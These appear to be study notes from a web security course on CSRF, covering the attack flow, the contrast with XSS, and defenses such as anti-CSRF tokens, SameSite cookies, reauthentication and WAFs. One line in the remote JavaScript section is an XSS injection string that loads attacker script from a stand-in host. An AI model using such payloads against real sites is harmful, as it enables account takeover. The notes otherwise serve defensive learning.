# Cross-Site Request Forgery (CSRF)

## Overview

**Cross-Site Request Forgery (CSRF)** is an attack where an authenticated user's browser is tricked into sending an unwanted request to a web application.

The key point is:

```text
The victim is already authenticated
        ↓
A malicious request is triggered
        ↓
The browser sends the victim's session
        ↓
The server processes the request as the victim
```

This may allow an attacker to perform actions using the victim's authenticated session.

---

# Example

Suppose a victim is already logged into a web application.

An attacker creates malicious code that sends a request to change the victim's password.

```text
Victim is logged in
      ↓
Victim loads malicious content
      ↓
Request to change password is sent
      ↓
Victim's authenticated session is used
      ↓
Password is changed
```

The attacker may then be able to log into the victim's account using the new password.

---

# CSRF and Privileged Users

CSRF becomes especially dangerous when the victim has elevated privileges.

For example:

```text
Administrator
     ↓
Malicious request executed
     ↓
Administrative action performed
```

If administrative functionality can modify sensitive settings or interact with the back-end server, the impact may be much greater.

---

# Remote JavaScript Example

The module shows an example where external JavaScript is loaded:

```html
"><script src=//www.example.com/exploit.js></script>
```

The remote file:

```text
exploit.js
```

would contain JavaScript designed to reproduce a legitimate application action, such as changing a password.

To create such a request, we would need to understand:

* The application's password-change process
* HTTP requests
* Parameters
* APIs
* Authentication behavior

---

# CSRF Attack Flow

A useful mental model is:

```text
Victim Logs In
      ↓
Browser Has Authenticated Session
      ↓
Victim Triggers Malicious Content
      ↓
Forged Request Is Sent
      ↓
Application Trusts the Session
      ↓
Action Is Performed
```

The important idea is that the attacker does not necessarily need to know the victim's password.

The attack abuses the fact that the victim's browser is already authenticated.

---

# CSRF vs XSS

Although both attacks affect web application users, they work differently.

```text
XSS
→ Attacker-controlled JavaScript executes in the browser

CSRF
→ Victim's browser is tricked into sending an authenticated request
```

A useful distinction:

```text
XSS  → Execute code as part of the site

CSRF → Perform an action using the victim's session
```

The module also explains that XSS may be used to help perform malicious requests.

---

# Input Sanitization

**Sanitization** removes or modifies unwanted characters from user-controlled input before it is displayed or stored.

Example:

```text
Input
  ↓
Sanitization
  ↓
Unsafe characters removed
  ↓
Safer output
```

This is especially relevant for preventing injection-based attacks such as:

* HTML Injection
* XSS

---

# Input Validation

**Validation** checks whether input matches the expected format.

Example:

```text
Expected:
email@example.com

Invalid:
random unexpected input
```

Conceptually:

```text
User Input
    ↓
Validation
    ↓
Does it match the expected format?
```

---

# CSRF Prevention

## Anti-CSRF Tokens

A common protection is the use of a unique **CSRF token**.

The application generates a value that must be included in sensitive requests.

```text
User Session
    ↓
Unique CSRF Token
    ↓
Request Includes Token
    ↓
Server Validates Token
```

A forged request without the correct token should be rejected.

---

## SameSite Cookies

The `SameSite` cookie attribute can restrict when browsers send cookies in cross-site requests.

Common values include:

```text
SameSite=Strict
SameSite=Lax
```

This can reduce the risk of authentication cookies being automatically included in cross-origin requests.

---

## Reauthentication

Sensitive actions may also require the user to enter their password again.

Example:

```text
Change Password
      ↓
Enter Current Password
      ↓
Server Verifies Identity
      ↓
Password Changed
```

This can limit the impact of CSRF attacks.

---

## Web Application Firewall

A **Web Application Firewall (WAF)** may help detect and block malicious requests.

However:

```text
WAF ≠ Complete Security
```

WAFs may be bypassed and should only be considered an additional defensive layer.

Applications should still be securely designed and implemented.

---

# Key Takeaways

* CSRF abuses an already authenticated user session.
* The victim's browser is tricked into sending an unwanted request.
* The server may interpret the request as legitimate because it contains the victim's authentication information.
* Privileged users such as administrators are especially valuable targets.
* CSRF attacks may target actions such as password changes.
* Anti-CSRF tokens are an important defense.
* `SameSite` cookies can restrict authentication cookies in cross-site requests.
* Sensitive operations may require reauthentication.
* Sanitization and validation help prevent other client-side injection vulnerabilities.
* WAFs are an additional layer of defense, not a replacement for secure application design.

---

# Pentesting Mindset

When analyzing a sensitive application action, we should ask:

```text
Does this request change application state?

Does it rely only on the user's session cookie?

Is there a CSRF token?

Is the token actually validated?

Does the application use SameSite cookies?

Does the action require reauthentication?
```

A useful way to remember CSRF is:

```text
CSRF =
Trick the victim's authenticated browser
into performing an unwanted action.
```
